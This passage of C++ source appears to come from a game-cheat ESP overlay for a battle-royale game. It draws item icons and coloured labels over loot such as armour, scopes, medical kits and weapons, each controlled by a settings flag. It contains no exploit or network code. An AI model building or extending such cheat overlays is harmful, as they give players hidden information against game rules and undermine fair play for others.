																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Flaregun, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Flaregun, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_FlareGun_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_FlareGun_Color[0], Setting::Esp_Item_FlareGun_Color[1], Setting::Esp_Item_FlareGun_Color[2], Setting::Esp_Item_FlareGun_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Flare && Item.Name == u8"Flare Ammo")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, air, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Flare_Color[0], Setting::Esp_Item_Flare_Color[1], Setting::Esp_Item_Flare_Color[2], Setting::Esp_Item_Flare_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_Armor3 && Item.Name == u8"Armor Lv.3")
													{
														if (Setting::Esp_Item_Armor3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::VestV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::VestV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Armor3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Armor3_Color[0], Setting::Esp_Item_Armor3_Color[1], Setting::Esp_Item_Armor3_Color[2], Setting::Esp_Item_Armor3_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Bag3 && Item.Name == u8"Bag Lv.3")
													{
														if (Setting::Esp_Item_Bag3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::BagV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::BagV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bag3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bag3_Color[0], Setting::Esp_Item_Bag3_Color[1], Setting::Esp_Item_Bag3_Color[2], Setting::Esp_Item_Bag3_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Helmet3 && Item.Name == u8"Helmet Lv.3")
													{
														if (Setting::Esp_Item_Helmet3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet3_Color[0], Setting::Esp_Item_Helmet3_Color[1], Setting::Esp_Item_Helmet3_Color[2], Setting::Esp_Item_Helmet3_Color[3]), true);
														continue;
														//}
													}  //
													if (Setting::Esp_Item_Awmimo && Item.Name == u8"300Magnum")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Awm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Awmimo_Color[0], Setting::Esp_Item_Awmimo_Color[1], Setting::Esp_Item_Awmimo_Color[2], Setting::Esp_Item_Awmimo_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_AR_Quick_Extended && Item.Name == u8"Ex QuickDraw")
													{
														if (Setting::Esp_Item_AR_Quick_Extended_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Quick_Extended_Color[0], Setting::Esp_Item_AR_Quick_Extended_Color[1], Setting::Esp_Item_AR_Quick_Extended_Color[2], Setting::Esp_Item_AR_Quick_Extended_Color[3]), true);
														continue;
														//}
													}
												}
												if (Setting::healthitem)
												{
													if (Setting::Esp_Item_MedKit && Item.Name == u8"Med Kit")
													{
														if (Setting::Esp_Item_MedKit_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::MedKit, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::MedKit, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_MedKit_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_MedKit_Color[0], Setting::Esp_Item_MedKit_Color[1], Setting::Esp_Item_MedKit_Color[2], Setting::Esp_Item_MedKit_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Bandage && Item.Name == u8"Bandage")
													{
														if (Setting::Esp_Item_Bandage_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Bandage, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Bandage, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bandage_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bandage_Color[0], Setting::Esp_Item_Bandage_Color[1], Setting::Esp_Item_Bandage_Color[2], Setting::Esp_Item_Bandage_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_FirstAidKit && Item.Name == u8"First Aid Kit")
													{
														if (Setting::Esp_Item_FirstAidKit_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::FirstAid, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::FirstAid, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_FirstAidKit_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_FirstAidKit_Color[0], Setting::Esp_Item_FirstAidKit_Color[1], Setting::Esp_Item_FirstAidKit_Color[2], Setting::Esp_Item_FirstAidKit_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Painkiller && Item.Name == u8"Painkiller")
													{
														if (Setting::Esp_Item_FirstAidKit_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Pinkiller, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Pinkiller, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Painkiller_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Painkiller_Color[0], Setting::Esp_Item_Painkiller_Color[1], Setting::Esp_Item_Painkiller_Color[2], Setting::Esp_Item_Painkiller_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_EnergyDrink && Item.Name == u8"Energy Drink")
													{
														if (Setting::Esp_Item_EnergyDrink_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::DrinkEnergy, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::DrinkEnergy, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_EnergyDrink_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_EnergyDrink_Color[0], Setting::Esp_Item_EnergyDrink_Color[1], Setting::Esp_Item_EnergyDrink_Color[2], Setting::Esp_Item_EnergyDrink_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_AdrenalineSyringe && Item.Name == u8"Adrenaline Syringe")
													{
														if (Setting::Esp_Item_EnergyDrink_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Injection, Screen.X - 50, Screen.Y - 25, 40, 40);
																continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Injection, Screen.X - 50, Screen.Y - 25, 40, 40);
																continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AdrenalineSyringe_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AdrenalineSyringe_Color[0], Setting::Esp_Item_AdrenalineSyringe_Color[1], Setting::Esp_Item_AdrenalineSyringe_Color[2], Setting::Esp_Item_AdrenalineSyringe_Color[3]), true);
														continue;
														//}
													}
												}
												if (Setting::scope)
												{
													if (Setting::Esp_Item_x2 && Item.Name == u8"2x")
													{
														if (Setting::Esp_Item_x2_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S2X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S2X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x2_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x2_Color[0], Setting::Esp_Item_x2_Color[1], Setting::Esp_Item_x2_Color[2], Setting::Esp_Item_x2_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x3 && Item.Name == u8"3x")
													{
														if (Setting::Esp_Item_x3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S3X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S3X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x3_Color[0], Setting::Esp_Item_x3_Color[1], Setting::Esp_Item_x3_Color[2], Setting::Esp_Item_x3_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x4 && Item.Name == u8"4x")
													{
														if (Setting::Esp_Item_x4_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S4X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S4X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x4_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x4_Color[0], Setting::Esp_Item_x4_Color[1], Setting::Esp_Item_x4_Color[2], Setting::Esp_Item_x4_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x6 && Item.Name == u8"6x")
													{
														if (Setting::Esp_Item_x6_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S6X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S6X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x6_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x6_Color[0], Setting::Esp_Item_x6_Color[1], Setting::Esp_Item_x6_Color[2], Setting::Esp_Item_x6_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x8 && Item.Name == u8"8x")
													{
														if (Setting::Esp_Item_x8_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S8X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S8X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x8_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x8_Color[0], Setting::Esp_Item_x8_Color[1], Setting::Esp_Item_x8_Color[2], Setting::Esp_Item_x8_Color[3]), true);
														continue;
														//}
													}
												}
												if (Setting::Esp_Item_GameCoin && Item.Name == u8"Shop Coin")
												{
													if (Setting::Esp_Item_GameCoin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::GameCoin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::GameCoin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_GameCoin_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_GameCoin_Color[0], Setting::Esp_Item_GameCoin_Color[1], Setting::Esp_Item_GameCoin_Color[2], Setting::Esp_Item_GameCoin_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_Benzin && Item.Name == u8"Benzin")
												{
													if (Setting::Esp_Item_Benzin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Benzin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Benzin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Benzin_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Benzin_Color[0], Setting::Esp_Item_Benzin_Color[1], Setting::Esp_Item_Benzin_Color[2], Setting::Esp_Item_Benzin_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_Dagger && Item.Name == u8"Dagger")
												{
													if (Setting::Esp_Item_Dagger_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Dagger, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Dagger, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Dagger_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Dagger_Color[0], Setting::Esp_Item_Dagger_Color[1], Setting::Esp_Item_Dagger_Color[2], Setting::Esp_Item_Dagger_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_ZombieBlade && Item.Name == u8"Zombie Blade")
												{
													if (Setting::Esp_Item_ZombieBlade_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ZombieBlade, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ZombieBlade, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_ZombieBlade_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_ZombieBlade_Color[0], Setting::Esp_Item_ZombieBlade_Color[1], Setting::Esp_Item_ZombieBlade_Color[2], Setting::Esp_Item_ZombieBlade_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_ZombieHammer && Item.Name == u8"Zombie Hammer")
												{
													if (Setting::Esp_Item_GameCoin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ZombieHammer, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ZombieHammer, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_ZombieHammer_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_ZombieHammer_Color[0], Setting::Esp_Item_ZombieHammer_Color[1], Setting::Esp_Item_ZombieHammer_Color[2], Setting::Esp_Item_ZombieHammer_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_Bag1 && Item.Name == u8"Bag Lv.1")
												{
													if (Setting::Esp_Item_Bag1_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BagV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BagV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//	else
													//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bag1_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bag1_Color[0], Setting::Esp_Item_Bag1_Color[1], Setting::Esp_Item_Bag1_Color[2], Setting::Esp_Item_Bag1_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Bag2 && Item.Name == u8"Bag Lv.2")
												{
													if (Setting::Esp_Item_Bag2_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BagV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BagV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bag2_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bag2_Color[0], Setting::Esp_Item_Bag2_Color[1], Setting::Esp_Item_Bag2_Color[2], Setting::Esp_Item_Bag2_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Helmet1 && Item.Name == u8"Helmet Lv.1")
												{
													if (Setting::Esp_Item_Helmet1_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet1_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet1_Color[0], Setting::Esp_Item_Helmet1_Color[1], Setting::Esp_Item_Helmet1_Color[2], Setting::Esp_Item_Helmet1_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Helmet2 && Item.Name == u8"Helmet Lv.2")
												{
													if (Setting::Esp_Item_Helmet2_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet2_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet2_Color[0], Setting::Esp_Item_Helmet2_Color[1], Setting::Esp_Item_Helmet2_Color[2], Setting::Esp_Item_Helmet2_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Armor1 && Item.Name == u8"Armor Lv.1")
												{
													if (Setting::Esp_Item_Armor1_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::VestV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::VestV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Armor1_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Armor1_Color[0], Setting::Esp_Item_Armor1_Color[1], Setting::Esp_Item_Armor1_Color[2], Setting::Esp_Item_Armor1_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Armor2 && Item.Name == u8"Armor Lv.2")
												{
													if (Setting::Esp_Item_Armor2_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::VestV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::VestV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Armor2_Color[0], Setting::Esp_Item_Armor2_Color[1], Setting::Esp_Item_Armor2_Color[2], Setting::Esp_Item_Armor2_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Mk47Mutant && Item.Name == u8"Mk47 Mutant")
												{
													if (Setting::Esp_Item_Mk47Mutant_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mk47, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mk47, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mk47Mutant_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mk47Mutant_Color[0], Setting::Esp_Item_Mk47Mutant_Color[1], Setting::Esp_Item_Mk47Mutant_Color[2], Setting::Esp_Item_Mk47Mutant_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_M16A4 && Item.Name == u8"M16A4")
												{
													if (Setting::Esp_Item_M16A4_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
